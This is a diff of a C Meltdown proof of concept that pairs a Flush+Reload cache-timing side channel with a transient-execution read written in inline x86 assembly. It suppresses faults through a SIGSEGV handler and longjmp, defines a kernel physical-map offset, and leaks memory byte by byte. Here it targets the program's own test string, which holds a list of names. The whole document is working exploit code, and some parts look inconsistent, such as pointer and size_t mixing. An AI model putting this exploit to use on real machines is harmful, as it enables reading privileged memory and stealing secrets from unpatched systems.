@@ -14,54 +14,41 @@
 
 
 size_t cache_miss_threshold = 0; /**< Cache miss threshold in cycles for Flush+Reload */
-int measurements = 10; /**< Number of measurements to perform for one address */
+int measurements = 100; /**< Number of measurements to perform for one address */
 int accept_after = 1; /**< How many measurements must be the same to accept the read value */
 int retries = 10000; /**< Number of Meltdown retries for an address */
 char *mem = NULL, *_mem = NULL;
 static size_t phys = 0;
-char *TestString = "ABCD";
+char *TestString = "Ammar + Khalid + Khalid + 7elmi + d7oom";
 static jmp_buf buf;
-int val;
+static int val;
+
+#define DEFAULT_PHYSICAL_OFFSET 0xffff880000000000ull
 
 
-static inline size_t rdtsc(){
-  asm volatile(
-    ".intel_syntax noprefix \n"
-    "_rdtsc: \n"
-    "mfence \n"
-    "lfence \n"
-    "rdtscp \n"
-    "lfence \n"
-  );
+
+static inline size_t rdtsc() {
+  size_t a = 0, d = 0;
+  asm volatile("mfence");
+  asm volatile("lfence");
+  asm volatile("rdtsc" : "=a"(a), "=d"(d));
+  asm volatile("lfence");
+  return a;
 }
 
-
-static inline void maccess(void *p){
-  asm volatile(
-    ".intel_syntax noprefix \n"
-    "_maccess: \n"
-    "enter 0,0 \n"
-    "mov rax, [rbp+8] \n"
-    "leave \n"
-  );
+static inline void maccess(void *p) {
+  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
 }
 
-
-static inline void flush(void *p){
-  asm volatile(
-    ".intel_syntax noprefix \n"
-   "_flush: \n"
-    "enter 0,0 \n"
-    "clflush [rbp+8] \n"
-    "leave \n"
-  );
+static void flush(void *p) {
+  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
 }
 
 
 
 void calc_cache_threshold(){
   size_t reload_time = 0, flush_reload_time = 0, count = 1000000;
-  size_t dummy[64];
+  size_t dummy[16];
   size_t *ptr = dummy + 8;
   size_t start = 0, end = 0;
 
@@ -77,7 +64,7 @@ void calc_cache_threshold(){
     maccess(ptr);
     end = rdtsc();
     flush(ptr);
-    flush_reload_time += (end-start);
+    flush_reload_time += (end - start);
   }
 
   reload_time /= count;
@@ -95,25 +82,29 @@ end = rdtsc();
 
 flush(ptr);
 /*                                         */
-if(end  - start < cache_miss_threshold){
+if((end  - start) < cache_miss_threshold){
   return 1;
 }
   return 0;
 }
 
-static void Meltdown(size_t p1, void *p2){
-  asm volatile(
-    ".intel_syntax noprefix \n"
-    "_Meltdown: \n"
-    "enter 0,0 \n"
-    "mov rcx, [rbp+8] \n"
-    "mov rbx, [rbp+12] \n"
-    "mov rax, [rcx] \n"
-    "shl rax, 0xc \n"
-    "mov rbx, [rbx+rax] \n"
-    "leave \n"
-  );
-}
+#ifdef __x86_64__
+
+
+#define meltdown_nonull                                                        \
+  asm volatile("1:\n"                                                          \
+               "movzx (%%rcx), %%rax\n"                                         \
+               "shl $12, %%rax\n"                                              \
+               "jz 1b\n"                                                       \
+               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
+               :                                                               \
+               : "c"(phys), "b"(mem)                                           \
+               : "rax");
+#endif
+
+#ifndef Meltdown
+#define Meltdown meltdown_nonull
+#endif
 
 
   static void unblock_signal(int signum __attribute__((__unused__))) {
@@ -129,18 +120,21 @@ static void Meltdown(size_t p1, void *p2){
     longjmp(buf,1);
     }
 
-int __attribute__((optimize("-Os"), noinline)) READ() {
+int __attribute__((optimize("-Os"), noinline)) READ(size_t addr) {
+  phys = addr;
   retries++;
+  size_t start = 0, end = 0;
+
 while(retries--){
  if(!setjmp(buf)){
-  signal(SIGSEGV,segfault_handler);
-  Meltdown(phys,mem);
+  Meltdown;
  }
-
-    for(int i = 0 ; i < 256 ; i++){
+    int i;
+    for(i = 0 ; i < 256 ; i++){
       if(Flush_Reload(mem + i*4096)){
         if(i>=1){
-          return i;
+          val = i;
+          return val;
         }
       }
     }
@@ -153,19 +147,18 @@ int __attribute__((optimize("-O0"))) Read(size_t addr){
   phys = addr;
 
   char prope[256];
-  for(int i = 0; i< 256; i++){
+  for(int i = 0; i< 256; i++)
     prope[i]=0;
-  }
 
   for(int i=0;i<measurements;i++){
-    int val = READ();
-    prope[val]++;
+    int vall = READ(phys);
+    prope[vall]++;
   }
 
   int max_v = 0, max_i = 0;
 
   for (int i = 1; i< 256; i++){
-    if (prope[i] > max_v && prope[i] > accept_after){
+    if (prope[i] > max_v && prope[i] >= accept_after){
       max_v = prope[i];
       max_i = i;
     }
@@ -175,24 +168,24 @@ int __attribute__((optimize("-O0"))) Read(size_t addr){
 
 
 __attribute__((visibility("default"))) int main() {
-
-    _mem = malloc(4096 * 300);
-    mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
-    memset(mem, 0xab, 4096 * 290);
-    for (int j = 0; j < 256; j++) {
-      flush(mem + j * 4096);
-    }
-
+  signal(SIGSEGV,segfault_handler);
   calc_cache_threshold();
-  printf("%ld\n",cache_miss_threshold);
 
-    size_t addr = 0x80000000;
+  _mem = malloc(4096 * 300);
+  mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
+  memset(mem, 0xab, 4096 * 290);
+  for (int j = 0; j < 256; j++) {
+    flush(mem + j * 4096);
+  }
+
+
+    size_t address = 0x0;
 
   while (1) {
-    int value = Read(addr);
-    printf("%c\n", value);
+    int value = Read(TestString);
+    printf("%c", value);
     fflush(stdout);
-    phys++;
+    TestString++;
   }
   free(_mem);
 
